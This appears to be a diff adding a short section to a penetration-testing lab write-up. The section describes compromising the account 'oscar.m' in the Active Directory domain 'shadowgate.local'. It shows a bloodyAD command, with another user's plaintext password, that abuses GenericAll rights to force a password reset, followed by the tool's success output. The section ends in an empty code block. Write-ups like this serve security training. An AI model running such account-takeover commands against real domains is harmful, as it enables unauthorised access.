@@ -583,4 +583,17 @@ This group represents the maintainers responsible for the SQL Server environment
 
 This user also has outbound object control on two users specifically GenericAll
 
+# Compromising `oscar.m`
 
+This user looks more interesting out of the two, since he can winrm
+
+```python
+bloodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u bogdan.r -p 'bogdan0126' set password 'oscar.m' 'Password123!'
+[+] Password changed successfully!
+```
+
+First ill change his password
+
+```python
+
+```
